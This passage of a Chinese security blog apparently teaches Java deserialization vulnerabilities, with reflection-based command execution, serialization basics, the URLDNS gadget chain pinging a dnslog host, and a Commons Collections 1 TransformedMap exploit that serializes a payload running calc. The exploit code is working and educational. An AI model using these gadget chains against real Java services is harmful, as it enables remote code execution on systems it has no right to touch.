<p><strong>解决办法</strong>：</p>
<ol type="1">
<li><p><strong>getRuntime()</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; runTimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//先找到Runtime这个Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//找到exec这个method</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//找到getRuntime()这个method</span></span><br><span class="line">Object o1=getRuntime.invoke(<span class="literal">null</span>);<span class="comment">//call getRuntime()来获取到Runtime实例</span></span><br><span class="line">exec.invoke(o1,<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//执行方法</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p><strong>setAccessible() - 访问private方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; runTimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//先找到Runtime这个Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//找到exec这个method</span></span><br><span class="line">Constructor&lt;?&gt; declaredConstructor = runTimeClass.getDeclaredConstructor();<span class="comment">//不带参数的getConstructor是会获取到无参构造方法的，但因为Runtime的Constructor是private的，所以我们需要使用Declared</span></span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);<span class="comment">//禁止java语言访问检查，让我们可以访问这个私有的constructor</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> declaredConstructor.newInstance();<span class="comment">//通过该constructor来创建新的instance</span></span><br><span class="line">exec.invoke(o1,<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//完成命令执行</span></span><br></pre></td></tr></table></figure></li>
</ol></li>
</ol>
<h4
id="java.lang.processbuilder命令执行">java.lang.ProcessBuilder命令执行</h4>
<ol type="1">
<li><p>Code</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; processBuilderClass = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);<span class="comment">//获取到ProcessBuilder这个class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">start</span> <span class="operator">=</span> processBuilderClass.getDeclaredMethod(<span class="string">&quot;start&quot;</span>);<span class="comment">//获取到start()这个方法</span></span><br><span class="line"><span class="comment">//因为两个constructor都是public的，所以我们可以只用用getConstructor而不用getDeclaredConstructor</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">oWithArg</span> <span class="operator">=</span> processBuilderClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;ipconfig&quot;</span>,<span class="string">&quot;/all&quot;</span>));<span class="comment">//获取带参数的命令的instance</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">oNoArg</span> <span class="operator">=</span> processBuilderClass.getConstructor(String[].class).newInstance((Object) <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;ipconfig&quot;</span>&#125;);<span class="comment">//获取不带参数的命令的instance</span></span><br><span class="line">Process argStart=(Process) start.invoke(oWithArg);</span><br><span class="line">Process noArgStart=(Process) start.invoke(oNoArg);</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">argIn</span> <span class="operator">=</span> argStart.getInputStream();<span class="comment">//获取Process的输出流来作为输入字节流</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">noArgIn</span> <span class="operator">=</span> noArgStart.getInputStream();<span class="comment">//获取Process的输出流来作为输入字节流</span></span><br><span class="line">InputStreamReader argReader=<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(argIn);<span class="comment">//把字节流转化为字符流</span></span><br><span class="line">InputStreamReader noArgReader=<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(noArgIn);<span class="comment">//把字节流转化为字符流</span></span><br><span class="line">BufferedReader argBr=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(argReader);<span class="comment">//为字符流提供缓冲区，以便一次性读取整块数据</span></span><br><span class="line">BufferedReader noArgBr=<span class="keyword">new</span> <span class="title class_">BufferedReader</span>(noArgReader);<span class="comment">//为字符流提供缓冲区，以便一次性读取整块数据</span></span><br><span class="line"></span><br><span class="line">String line=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">while</span>((line=argBr.readLine())!=<span class="literal">null</span>)&#123;<span class="comment">//一行行读取</span></span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((line=noArgBr.readLine())!=<span class="literal">null</span>)&#123;<span class="comment">//一行行读取</span></span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="java反序列化漏洞之java-rmi原理流程2">Java反序列化漏洞之JAVA
RMI原理、流程(2)</h3>
<h3
id="java反序列化漏洞之java反序列化流程与分析3">Java反序列化漏洞之Java反序列化流程与分析(3)</h3>
<ol type="1">
<li><strong>Java反序列化</strong>会根据该二进制流，<strong>重新创建</strong>一个相同状态下的object。Java反序列化不会用<code>constructor</code>来创建一个object，相反，他会创建一个空的object，然后用<strong>Java反射</strong>把数据写进属性里，所以在重新创建object的时候，<code>constructor</code>里的代码是不会被执行的（除了实现Externalizable接口的Class，之后会提到）。<strong>常用readObject()来反序列化Object</strong></li>
<li>Java在序列化和反序列化的过程中，都用到了<a
target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/07/21/Java反序列化漏洞之Java反射机制-1/">Java反射机制</a>（需要注意的是，实现Externalizable接口并不会使用Java反射机制，这一点会在后面的内容中讲到），而整个过程其实就是数据转换为二进制流，再根据数据<strong>重新创建</strong>一个相同的object。</li>
</ol>
<h4 id="serializable接口">Serializable接口</h4>
<ol type="1">
<li><p>如果一个Class想要被序列化，那么他<strong>必须</strong><code>implements Serializable</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span><span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;shulei&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>编写实现序列化与反序列化Class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Student student=<span class="keyword">new</span> <span class="title class_">Student</span>();<span class="comment">//create a Student instance</span></span><br><span class="line">        serializeObj(student);</span><br><span class="line">        deserializeObj();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeObj</span><span class="params">(Student student)</span> <span class="keyword">throws</span> Exception &#123;<span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.cer&quot;</span>);<span class="comment">//创建一个文件输出流，文件名为test.cer</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);<span class="comment">//创建一个对象输出流，对象数据流中的数据将输出到文件输出流中</span></span><br><span class="line">        objectOutputStream.writeObject(student);<span class="comment">//将student这个object输入到文件输出流中</span></span><br><span class="line">        objectOutputStream.close();<span class="comment">//关闭文件输出流和对象输出流，避免内存泄露</span></span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">//序列化完成</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.cer&quot;</span>);<span class="comment">//创建文件输入流，读取test.cer</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);<span class="comment">//创建对象输入流，将文件输入流里的数据输入对象输入流</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span>(Student)objectInputStream.readObject();<span class="comment">//读取输入流中的对象，强制转换为Student类型，重构对象</span></span><br><span class="line">        student.hello();<span class="comment">//call方法</span></span><br><span class="line">        <span class="comment">//反序列化完成</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="externalizable接口">Externalizable接口</h4>
<ol type="1">
<li><p>使用<code>Externalizable</code>来标识Class是可序列化的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Externalizable</span> <span class="keyword">extends</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol type="1">
<li><code>writeExternal()</code>和<code>readExternal()</code>分别替代了<code>writeObject()</code>和<code>readObject()</code>两个methods,开发者需要手动对数据进行序列化和反序列化，这意味着，我们可以<strong>选择性</strong>地序列化和反序列化某些属性，相比Serializable接口就更加的灵活了。</li>
</ol></li>
<li><p>编写Externalizable Class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XiaoXueSheng</span>  <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XiaoXueSheng</span><span class="params">()</span> &#123;<span class="comment">//此无参数的构造方法必须存在</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XiaoXueSheng</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);<span class="comment">//将name写入对象输出流和文件输出流</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)in.readObject();<span class="comment">//从对象输入流中获取name</span></span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h3
id="java反序列化漏洞之利用链分析集合4">Java反序列化漏洞之利用链分析集合(4)</h3>
<h4 id="urldns利用链">Urldns利用链</h4>
<ol type="1">
<li><p>Code</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();<span class="comment">// 定义一个hashMap，key为URL,value为String</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://e3h66m.dnslog.cn&quot;</span>);<span class="comment">// 设置我们触发dns查询的url</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 下面在put前修改url的hashcode为非-1的值，put后将hashcode修改为-1</span></span><br><span class="line">        <span class="comment">// 1. 将url的hashCode字段设置为允许修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 2. 设置url的hashCode字段为任意不为-1的值</span></span><br><span class="line">        f.set(url, <span class="number">111</span>);</span><br><span class="line">        System.out.println(url.hashCode()); <span class="comment">// 获取hashCode的值，验证是否修改成功</span></span><br><span class="line">        <span class="comment">// 3. 将 url 放入 hashMap 中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">// 4. 修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化操作</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化，触发payload</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>java 1.8利用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap-&gt;readObject</span><br><span class="line">HashMap-&gt;putval 或 HashMap-&gt;hash</span><br><span class="line">URL-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;getHostAddress</span><br><span class="line">    .....</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="ysoserial中的利用链">Ysoserial中的利用链</h5>
<ol type="1">
<li>巧妙的SilentURLStreamHandler</li>
</ol>
<h4 id="apache-commons-collections-利用链">Apache Commons Collections
利用链</h4>
<h5 id="commons-collections-1-transformedmap版本">Commons Collections
1-TransformedMap版本</h5>
<ol type="1">
<li><p>有限制的利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//首先创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>),<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//执行payload</span></span><br><span class="line">        invokerTransformer.transform(input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>改进后的利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, InstantiationException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;anyContent&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<span class="comment">//反射获取该类</span></span><br><span class="line">        Constructor&lt;?&gt; aConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<span class="comment">//获取构造方法</span></span><br><span class="line">        aConstructor.setAccessible(<span class="literal">true</span>);<span class="comment">//取消构造方法限制</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aConstructor.newInstance(Target.class, myMap);<span class="comment">//传入参数和malicious map</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Jf71o0x1o1l</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://Jf710001011.github.io/2023/12/09/java/">https://Jf710001011.github.io/2023/12/09/java/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint polocy. If reproduced, please indicate source
                    <a href="/about" target="_blank">Jf71o0x1o1l</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Java/">
                                    <span class="chip bg-color">Java</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

